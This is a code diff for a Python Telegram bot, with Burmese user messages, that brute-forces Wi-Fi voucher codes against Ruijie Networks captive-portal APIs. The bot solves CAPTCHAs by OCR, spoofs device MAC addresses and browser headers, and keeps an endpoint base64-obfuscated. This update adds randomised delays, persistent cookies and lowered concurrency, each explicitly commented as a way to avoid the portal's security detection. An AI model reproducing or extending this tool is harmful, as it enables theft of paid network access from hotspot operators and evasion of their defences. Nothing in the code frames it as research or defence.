@@ -9,7 +9,7 @@ import numpy as np
 from datetime import datetime, timedelta, timezone
 
 # ═══════════════════════════════════════════════════════════════════════════
-# ⭐ UPDATED: Logging setup with file output
+# ⭐ OCTOBER 2026 UPDATE: Avoid Security Risk Detection
 # ═══════════════════════════════════════════════════════════════════════════
 logging.basicConfig(
     level=logging.INFO,
@@ -54,57 +54,72 @@ limited_messages = {}
 session = None
 _connector = None
 
-# ⭐ UPDATED: Increased for better reliability
-CONCURRENCY = 300
-BATCH_SIZE = 500
-CAPTCHA_RETRY = 8                # Increased from 5
-MAX_ATTEMPTS = 3                 # Increased from 2
-PROGRESS_INTERVAL = 3
+# ═══════════════════════════════════════════════════════════════════════════
+# ⭐ OCTOBER 2026: Reduced speed to avoid detection
+# ═══════════════════════════════════════════════════════════════════════════
+CONCURRENCY = 10          # ⭐ Reduced from 300 to avoid security detection
+BATCH_SIZE = 20           # ⭐ Reduced from 500
+CAPTCHA_RETRY = 3         # Reduced retries
+MAX_ATTEMPTS = 2          # Reduced attempts
+PROGRESS_INTERVAL = 5     # Update progress every 5 seconds
 GITHUB_INTERVAL = 30
-SESSION_RECHECK_INTERVAL = 1800  # ⭐ 30 minutes — safer for WiFiDog portals
+SESSION_RECHECK_INTERVAL = 1800  # 30 minutes
+
+# ⭐ Add delay between batches
+BATCH_DELAY = (5, 15)     # 5-15 seconds between batches
+
+# ⭐ Add delay between requests
+REQUEST_DELAY = (1, 3)    # 1-3 seconds between requests
+
 _voucher_sem = None
 _start_time = time.monotonic()
 
+# ⭐ Session MACs for consistency
+SESSION_MACS = {}
+COOKIE_JARS = {}
+
 # ═══════════════════════════════════════════════════════════════════════════
-# ⭐ UPDATED: Portal Configurations with portal-eu support
+# ⭐ UPDATED: Portal Configurations with v2 API support
 # ═══════════════════════════════════════════════════════════════════════════
 PORTAL_CONFIGS = {
     "portal-mm-as": {
         "domain": "portal-mm-as.ruijienetworks.com",
         "base_url": "https://portal-mm-as.ruijienetworks.com",
-        "voucher_api": base64.b64decode(
+        "voucher_api": "https://portal-mm-as.ruijienetworks.com/api/v2/auth/voucher?lang=en_US",
+        "voucher_api_v1": base64.b64decode(
             b'aHR0cHM6Ly9wb3J0YWwtbW0tYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
         ).decode(),
-        "balance_api": "https://portal-mm-as.ruijienetworks.com/api/auth/balance/getBalance",
-        "captcha_image_api": "https://portal-mm-as.ruijienetworks.com/api/auth/captcha/image",
-        "captcha_verify_api": "https://portal-mm-as.ruijienetworks.com/api/auth/captcha/verify",
-        "referer_index": "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
-        "referer_balance": "https://portal-mm-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetworks.com&authType=15",
+        "balance_api": "https://portal-mm-as.ruijienetworks.com/api/v2/auth/balance/getBalance",
+        "captcha_image_api": "https://portal-mm-as.ruijienetworks.com/api/v2/auth/captcha/image",
+        "captcha_verify_api": "https://portal-mm-as.ruijienetworks.com/api/v2/auth/captcha/verify",
+        "referer_index": "https://portal-mm-as.ruijienetworks.com/portal/index.html?sessionId=",
+        "referer_balance": "https://portal-mm-as.ruijienetworks.com/portal/balance.html?sessionId={token}&lang=en_US",
     },
     "portal-as": {
         "domain": "portal-as.ruijienetworks.com",
         "base_url": "https://portal-as.ruijienetworks.com",
-        "voucher_api": base64.b64decode(
+        "voucher_api": "https://portal-as.ruijienetworks.com/api/v2/auth/voucher?lang=en_US",
+        "voucher_api_v1": base64.b64decode(
             b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
         ).decode(),
-        "balance_api": "https://portal-as.ruijienetworks.com/api/auth/balance/getBalance",
-        "captcha_image_api": "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
-        "captcha_verify_api": "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
-        "referer_index": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
-        "referer_balance": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetworks.com&authType=15",
+        "balance_api": "https://portal-as.ruijienetworks.com/api/v2/auth/balance/getBalance",
+        "captcha_image_api": "https://portal-as.ruijienetworks.com/api/v2/auth/captcha/image",
+        "captcha_verify_api": "https://portal-as.ruijienetworks.com/api/v2/auth/captcha/verify",
+        "referer_index": "https://portal-as.ruijienetworks.com/portal/index.html?sessionId=",
+        "referer_balance": "https://portal-as.ruijienetworks.com/portal/balance.html?sessionId={token}&lang=en_US",
     },
-    # ⭐ NEW: EU Portal (for Europe/US/ME regions)
     "portal-eu": {
         "domain": "portal-eu.ruijienetworks.com",
         "base_url": "https://portal-eu.ruijienetworks.com",
-        "voucher_api": base64.b64decode(
+        "voucher_api": "https://portal-eu.ruijienetworks.com/api/v2/auth/voucher?lang=en_US",
+        "voucher_api_v1": base64.b64decode(
             b'aHR0cHM6Ly9wb3J0YWwtZXUucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
         ).decode(),
-        "balance_api": "https://portal-eu.ruijienetworks.com/api/auth/balance/getBalance",
-        "captcha_image_api": "https://portal-eu.ruijienetworks.com/api/auth/captcha/image",
-        "captcha_verify_api": "https://portal-eu.ruijienetworks.com/api/auth/captcha/verify",
-        "referer_index": "https://portal-eu.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=",
-        "referer_balance": "https://portal-eu.ruijienetworks.com/download/static/maccauth/src/balance.html?RES=./../expand/res/4ukmferxbdgmt3m49po&sessionId={token}&lang=en_US&redirectUrl=https://www.ruijienetworks.com&authType=15",
+        "balance_api": "https://portal-eu.ruijienetworks.com/api/v2/auth/balance/getBalance",
+        "captcha_image_api": "https://portal-eu.ruijienetworks.com/api/v2/auth/captcha/image",
+        "captcha_verify_api": "https://portal-eu.ruijienetworks.com/api/v2/auth/captcha/verify",
+        "referer_index": "https://portal-eu.ruijienetworks.com/portal/index.html?sessionId=",
+        "referer_balance": "https://portal-eu.ruijienetworks.com/portal/balance.html?sessionId={token}&lang=en_US",
     }
 }
 
@@ -148,7 +163,7 @@ async def _safe_edit(chat_id, message_id, text, parse_mode=None):
 
 # ── Web server (keep alive) ────────────────────────────────────────────────
 async def handle(request):
-    return web.Response(text="Bot is awake and running 24/7! Updated: 2026-10-17")
+    return web.Response(text="Bot is awake and running 24/7! Updated: 2026-10-18")
 
 async def web_server():
     app = web.Application()
@@ -290,26 +305,82 @@ def is_expired(expire_str):
         return False
     return dt < datetime.now()
 
+# ═══════════════════════════════════════════════════════════════════════════
+# ⭐ OCTOBER 2026: Realistic MAC generation
+# ═══════════════════════════════════════════════════════════════════════════
+def get_realistic_mac():
+    """
+    Generate realistic MAC that looks like a real device
+    Use common OUI prefixes
+    """
+    oui_prefixes = [
+        [0x00, 0x1A, 0x2B],  # Samsung
+        [0x00, 0x1B, 0x63],  # Apple
+        [0x00, 0x1E, 0xC2],  # Intel
+        [0x00, 0x21, 0x6A],  # Cisco
+        [0x00, 0x23, 0x12],  # D-Link
+        [0x00, 0x25, 0x9C],  # Huawei
+        [0x00, 0x26, 0xBB],  # Fujitsu
+        [0x00, 0x50, 0x56],  # VMware
+        [0x08, 0x00, 0x27],  # VirtualBox
+    ]
+
+    oui = random.choice(oui_prefixes)
+    mac = oui + [random.randint(0x00, 0xff) for _ in range(3)]
+    return ':'.join(f'{x:02x}' for x in mac)
+
+def get_session_mac(chat_id):
+    """Get or create consistent MAC for session"""
+    if chat_id not in SESSION_MACS:
+        SESSION_MACS[chat_id] = get_realistic_mac()
+    return SESSION_MACS[chat_id]
+
+def get_cookie_jar(chat_id):
+    """Get or create persistent cookie jar for session"""
+    if chat_id not in COOKIE_JARS:
+        COOKIE_JARS[chat_id] = aiohttp.CookieJar()
+    return COOKIE_JARS[chat_id]
+
+def get_realistic_headers(portal_config, session_id=None):
+    """Generate realistic browser headers"""
+    user_agents = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+    ]
+
+    ua = random.choice(user_agents)
+
+    headers = {
+        "authority": portal_config['domain'],
+        "accept": "application/json, text/javascript, */*; q=0.01",
+        "accept-language": "en-US,en;q=0.9",
+        "content-type": "application/json",
+        "origin": portal_config['base_url'],
+        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": ua,
+        "x-requested-with": "XMLHttpRequest",
+    }
+
+    if session_id:
+        headers["referer"] = portal_config['referer_index'] + session_id
+
+    return headers
+
 async def get_balance(token, portal_config):
     url = f"{portal_config['balance_api']}/{token}"
     cookies = {
         'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllNDYwZWY0NDQ1MDctMDkxZWY5MGMwMjg3NDUtMWU0NjJjNmUtMzQzMDg5LTE5ZTQ2MGVmNDQ1MmFiIn0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%7D',
     }
-    headers = {
-        'authority': portal_config['domain'],
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-        'content-type': 'application/json;',
-        'referer': portal_config['referer_balance'].format(token=token),
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Linux"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-    }
+    headers = get_realistic_headers(portal_config)
+    headers['referer'] = portal_config['referer_balance'].format(token=token)
+
     try:
         async with session.get(url, headers=headers, cookies=cookies, timeout=aiohttp.ClientTimeout(total=8)) as resp:
             raw = await resp.text()
@@ -412,74 +483,62 @@ def _ocr_sync(image_bytes):
 async def Captcha_Text(image_bytes):
     return await asyncio.to_thread(_ocr_sync, image_bytes)
 
-def get_mac():
-    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
-    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
-    return ':'.join(f'{x:02x}' for x in mac)
-
 def replace_mac(url, new_mac):
     return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
 
 async def get_session_id(session_obj, session_url, previous_session_id=None):
-    mac = get_mac()
-    url = replace_mac(session_url, new_mac=mac)
+    """
+    ⭐ UPDATED: October 2026
+    - Use original MAC from URL instead of random MAC
+    - Add delay between requests
+    - Better error handling
+    """
+    # ⭐ Use original MAC from URL (don't spoof)
+    mac_match = re.search(r'mac=([^&]+)', session_url)
+    original_mac = mac_match.group(1) if mac_match else get_realistic_mac()
+
+    url = session_url  # Don't replace MAC
+
     headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
         'accept-language': 'en-US,en;q=0.9',
-        'priority': 'u=0, i',
-        'referer': url,
-        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
-        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36',
+        'referer': 'http://detectportal.firefox.com/',
     }
+
     try:
+        # ⭐ Add delay to avoid rate limiting
+        await asyncio.sleep(random.uniform(0.5, 1.5))
+
         async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
             response = str(req.url)
+
+            # Check for security risk message
+            body = await req.text()
+            if "security risks" in body or "should be upgraded" in body:
+                log.error(f"[get_session_id] Portal blocked: security risk detected")
+                return None
+
             sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
             return sid.group(1) if sid else previous_session_id
-    except:
+
+    except Exception as e:
+        log.debug(f"[get_session_id] error: {e}")
         return previous_session_id
 
 async def Captcha_Image(session_obj, session_id, portal_config):
-    headers = {
-        'authority': portal_config['domain'],
-        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
-        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-        'referer': portal_config['referer_index'] + session_id,
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Linux"',
-        'sec-fetch-dest': 'image',
-        'sec-fetch-mode': 'no-cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
-    }
+    headers = get_realistic_headers(portal_config, session_id)
+    headers['accept'] = 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8'
+    headers['sec-fetch-dest'] = 'image'
+    headers['sec-fetch-mode'] = 'no-cors'
+
     params = {'sessionId': session_id, '_t': str(time.time())}
     async with session_obj.get(portal_config['captcha_image_api'], params=params, headers=headers) as req:
         return await req.read()
 
 async def Varify_Captcha(session_obj, session_id, text, portal_config):
-    headers = {
-        'authority': portal_config['domain'],
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-        'content-type': 'application/json',
-        'origin': portal_config['base_url'],
-        'referer': portal_config['referer_index'] + session_id,
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Linux"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
-    }
+    headers = get_realistic_headers(portal_config, session_id)
+
     json_data = {'sessionId': session_id, 'authCode': text}
     async with session_obj.post(portal_config['captcha_verify_api'], headers=headers, json=json_data) as req:
         data = await req.json()
@@ -491,15 +550,9 @@ async def Varify_Captcha(session_obj, session_id, text, portal_config):
 async def check_session_url(session_url):
     """
     Check if session URL is valid for WiFiDog portals.
-
-    WiFiDog portals (portal-as.ruijienetworks.com) don't always redirect
-    with sessionId in URL. We need to:
-    1. Check if URL has required WiFiDog parameters
-    2. Try to get session ID using random MAC (like perform_check does)
-    3. Fallback: check if portal responds at all
     """
     try:
-        # Method 1: Check if URL has required WiFiDog parameters
+        # Check if URL has required WiFiDog parameters
         required_params = ['gw_id', 'gw_address', 'gw_port']
         has_params = all(param in session_url for param in required_params)
 
@@ -507,7 +560,7 @@ async def check_session_url(session_url):
             log.warning(f"[check_session_url] missing WiFiDog params in URL")
             return False
 
-        # Method 2: Try to get session ID (same as perform_check)
+        # Try to get session info
         portal_config, portal_name = get_portal_config(session_url)
 
         timeout = aiohttp.ClientTimeout(total=15)
@@ -517,29 +570,64 @@ async def check_session_url(session_url):
             cookie_jar=aiohttp.CookieJar(),
             timeout=timeout
         ) as test_session:
-            session_id = await get_session_id(test_session, session_url)
-            if session_id:
-                log.info(f"[check_session_url] got sessionId: {session_id[:20]}...")
-                return True
 
-            # Method 3: Fallback - check if portal responds at all
+            # Use random MAC like perform_check does
+            mac = get_realistic_mac()
+            test_url = replace_mac(session_url, new_mac=mac)
+
+            headers = {
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                'accept-language': 'en-US,en;q=0.9',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            }
+
             async with test_session.get(
-                session_url, 
+                test_url, 
                 allow_redirects=True,
+                headers=headers,
                 timeout=aiohttp.ClientTimeout(total=10)
             ) as resp:
-                # If we get any HTTP response (even 200/302/403), portal is alive
-                if resp.status < 500:
+
+                # Check for security risk message
+                body = await resp.text()
+                if "security risks" in body or "should be upgraded" in body:
+                    log.error(f"[check_session_url] SECURITY RISK DETECTED")
+                    return False
+
+                # Method 1: Check redirect URL for sessionId
+                response_url = str(resp.url)
+                if "sessionId" in response_url:
+                    log.info(f"[check_session_url] sessionId found in URL")
                     return True
+
+                # Method 2: Check response body for sessionId
+                if "sessionId" in body or "session_id" in body:
+                    log.info(f"[check_session_url] sessionId found in body")
+                    return True
+
+                # Method 3: If we get any successful response, session is likely valid
+                if resp.status == 200:
+                    log.info(f"[check_session_url] got 200 response, assuming valid")
+                    return True
+
+                # Method 4: Check for redirect (302/303)
+                if resp.status in [301, 302, 303, 307, 308]:
+                    log.info(f"[check_session_url] got redirect {resp.status}, assuming valid")
+                    return True
+
+                log.warning(f"[check_session_url] unexpected status: {resp.status}")
                 return False
 
     except Exception as e:
         log.debug(f"[check_session_url] error: {e}")
         return False
 
-# ── Core voucher check ────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════
+# ⭐ UPDATED: Core voucher check with security detection
+# ═══════════════════════════════════════════════════════════════════════════
 async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
     global _connector
+
     if not recheck:
         current_task = scan_tasks.get(chat_id)
         if not current_task or current_task.get("scan_id") != scan_id:
@@ -551,19 +639,32 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
     response = None
     session_id = None
 
+    # ⭐ Use consistent MAC for this session
+    session_mac = get_session_mac(chat_id)
+
     for attempt in range(MAX_ATTEMPTS):
         timeout = aiohttp.ClientTimeout(total=20)
         try:
             async with aiohttp.ClientSession(
                 connector=_connector,
                 connector_owner=False,
-                cookie_jar=aiohttp.CookieJar(),
+                cookie_jar=get_cookie_jar(chat_id),  # ⭐ Persistent cookies
                 timeout=timeout
             ) as task_session:
-                session_id = await get_session_id(task_session, session_url)
+
+                # ⭐ Don't replace MAC - use original from URL
+                if 'mac=' in session_url:
+                    url = session_url  # Use original MAC
+                else:
+                    url = session_url + f"&mac={session_mac}"
+
+                session_id = await get_session_id(task_session, url)
                 if not session_id:
                     log.debug(f"[perform_check] no session_id for {code}, attempt {attempt+1}")
                     continue
+
+                # ⭐ Add realistic delay (2-5 seconds)
+                await asyncio.sleep(random.uniform(2, 5))
 
                 auth_code = None
                 for captcha_attempt in range(CAPTCHA_RETRY):
@@ -594,32 +695,45 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     "apiVersion": 1,
                     "authCode": auth_code,
                 }
-                headers = {
-                    "authority": portal_config['domain'],
-                    "accept": "*/*",
-                    "accept-language": "en-US,en;q=0.9",
-                    "content-type": "application/json",
-                    "origin": portal_config['base_url'],
-                    "referer": portal_config['referer_index'] + session_id,
-                    "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
-                    "sec-ch-ua-mobile": "?1",
-                    "sec-ch-ua-platform": '"Android"',
-                    "sec-fetch-dest": "empty",
-                    "sec-fetch-mode": "cors",
-                    "sec-fetch-site": "same-origin",
-                    "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
-                }
+
+                # ⭐ More realistic headers
+                headers = get_realistic_headers(portal_config, session_id)
+
+                # ⭐ Add delay before voucher check
+                await asyncio.sleep(random.uniform(1, 3))
+
                 try:
                     async with task_session.post(post_url, json=data, headers=headers) as req:
                         response = await req.text()
+
+                        # ⭐ Check for security risk message
+                        if "security risks" in response:
+                            log.error(f"[perform_check] SECURITY RISK DETECTED for {code}")
+                            # Notify admin
+                            if ADMIN_ID:
+                                try:
+                                    await bot.send_message(
+                                        int(ADMIN_ID),
+                                        f"🚨 SECURITY RISK DETECTED!\nPortal: {portal_name}\nCode: {code}\nStopping scan..."
+                                    )
+                                except:
+                                    pass
+                            # Stop all scans
+                            for cid, task_data in scan_tasks.items():
+                                task_data["stop"] = True
+                                if not task_data["task"].done():
+                                    task_data["task"].cancel()
+                            return None
+
                         json.loads(response)
+
                 except Exception as e:
                     log.debug(f"[perform_check] network error for {code}: {e}")
                     continue
 
             if response and 'request limited' in response:
                 wait = min(2 ** attempt, 6)
-                log.info(f"[perform_check] rate limited, waiting {wait}s (attempt {attempt+1}/{MAX_ATTEMPTS})")
+                log.info(f"[perform_check] rate limited, waiting {wait}s")
                 await asyncio.sleep(wait)
                 continue
             break
@@ -727,7 +841,9 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     chat_id, limited_messages[chat_id], full
                 )
 
-# ── Brute-force runner ────────────────────────────────────────────────────
+# ═══════════════════════════════════════════════════════════════════════════
+# ⭐ UPDATED: Brute-force runner with delays
+# ═══════════════════════════════════════════════════════════════════════════
 async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None, plan_filters=None):
     try:
         code_iter = iter_codes(mode, length)
@@ -761,6 +877,8 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=Non
 
             async def _check(code):
                 async with _voucher_sem:
+                    # ⭐ Add delay between requests
+                    await asyncio.sleep(random.uniform(*REQUEST_DELAY))
                     return await perform_check(
                         session_url, code, chat_id, scan_id, message=message,
                         plan_filters=plan_filters
@@ -788,6 +906,10 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=Non
                 if new_id != progress_msg.message_id:
                     progress_msg.message_id = new_id
                 last_progress_update = now
+
+            # ⭐ Add delay between batches
+            await asyncio.sleep(random.uniform(*BATCH_DELAY))
+
     finally:
         scan_tasks.pop(chat_id, None)
 
@@ -821,9 +943,7 @@ async def github_update_scheduler():
             for item in items:
                 await SUCCESS_CODE.put(item)
 
-# ═══════════════════════════════════════════════════════════════════════════
-# ⭐ UPDATED: Session URL periodic revalidation with better logging
-# ═══════════════════════════════════════════════════════════════════════════
+# ── Session URL periodic revalidation ─────────────────────────────────────
 async def session_recheck_scheduler():
     while True:
         await asyncio.sleep(SESSION_RECHECK_INTERVAL)
@@ -843,7 +963,6 @@ async def session_recheck_scheduler():
                         )
                     except:
                         pass
-                    # Auto-stop scan if running
                     task_data = scan_tasks.get(cid)
                     if task_data:
                         task_data["stop"] = True
@@ -857,12 +976,12 @@ async def session_recheck_scheduler():
 # ── Bot commands ───────────────────────────────────────────────────────────
 @bot.message_handler(commands=['start'])
 async def start(message):
-    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။\n\n🛡️ Updated: 2026-10-17")
+    await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။\n\n🛡️ Updated: 2026-10-18 (Security Enhanced)")
 
 @bot.message_handler(commands=['help'])
 async def help_cmd(message):
     help_text = (
-        "📚 **Command လမ်းညွှန်** (Updated: 2026-10-17)\n\n"
+        "📚 **Command လမ်းညွှန်** (Updated: 2026-10-18)\n\n"
         "၁။ **Setup**:\n"
         "   /setup <url>\n"
         "   (portal-mm-as, portal-as, portal-eu URL)\n\n"
@@ -882,8 +1001,10 @@ async def help_cmd(message):
         "၇။ /delete_saved – ရလဒ်ဖျက်ခြင်း\n"
         "၈။ /recheck – Success codes ပြန်စစ်ခြင်း\n"
         "၉။ /notify  – Notification ON/OFF\n"
-        "၁၀။ /testbalance – Balance စစ်ခြင်း (Admin only)\n\n"
-        "🛡️ **2026 Security Updates Applied**"
+        "၁၀။ /testbalance – Balance စစ်ခြင်း (Admin only)\n"
+        "၁၁။ /discover – Portal endpoints ရှာဖွေခြင်း (Admin only)\n\n"
+        "🛡️ **Security Enhanced Version**\n"
+        "⚠️ Speed လျှော့ထားပါတယ် (Detection ရှောင်ရန်)"
     )
     await bot.reply_to(message, help_text, parse_mode="Markdown")
 
@@ -903,10 +1024,10 @@ async def handle_setup(message):
 
     url = args[1]
 
-    # ⭐ Detect portal type
+    # Detect portal type
     portal_config, portal_name = get_portal_config(url)
 
-    # ⭐ Check if it's a WiFiDog URL
+    # Check if it's a WiFiDog URL
     is_wifidog = 'wifidog' in url.lower() or 'stage=portal' in url.lower()
 
     await bot.reply_to(message, f"Session URL စစ်ဆေးနေပါသည်...\n🌐 Portal: {portal_name}")
@@ -924,6 +1045,10 @@ async def handle_setup(message):
         pending_brute.pop(cid, None)
         success_messages.pop(cid, None)
         limited_messages.pop(cid, None)
+
+        # Clear session MAC and cookies
+        SESSION_MACS.pop(cid, None)
+        COOKIE_JARS.pop(cid, None)
 
         try:
             results, sha = await get_file_content("result.json")
@@ -957,7 +1082,8 @@ async def brute(message):
             "  4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
             "  5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n\n"
             "ဥပမာ:\n"
-            "/brute 1 6 5\n/brute 2 6\n/brute 5 8 10"
+            "/brute 1 6 5\n/brute 2 6\n/brute 5 8 10\n\n"
+            "⚠️ Note: Speed လျှော့ထားပါတယ် (Security detection ရှောင်ရန်)"
         )
         return
 
@@ -1000,7 +1126,7 @@ async def brute(message):
 async def start_brute_scan(chat_id, mode, length, target, original_message, plan_filters=None):
     plan_filters = plan_filters or []
     filter_note = f" | Filter: {' / '.join(plan_filters)}" if plan_filters else ""
-    progress_msg = await bot.send_message(chat_id, f"Preparing...{filter_note}")
+    progress_msg = await bot.send_message(chat_id, f"Preparing...{filter_note}\n⚠️ Safe mode enabled (slow speed)")
     scan_id = str(uuid.uuid4())
     task = asyncio.create_task(
         run_bruteforce(
@@ -1203,12 +1329,11 @@ async def status(message):
         except Exception:
             sem_info = f"?/{CONCURRENCY}"
 
-    # ⭐ Count WiFiDog sessions
     wifidog_count = sum(1 for d in user_data.values() if d.get('is_wifidog', False))
 
     await bot.reply_to(
         message,
-        f"📊 Bot Status (Updated: 2026-10-17)\n\n"
+        f"📊 Bot Status (Updated: 2026-10-18)\n\n"
         f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
         f"🔍 Active Scans: {active_scans}\n"
         f"👥 Sessions Loaded: {len(user_data)}\n"
@@ -1220,7 +1345,10 @@ async def status(message):
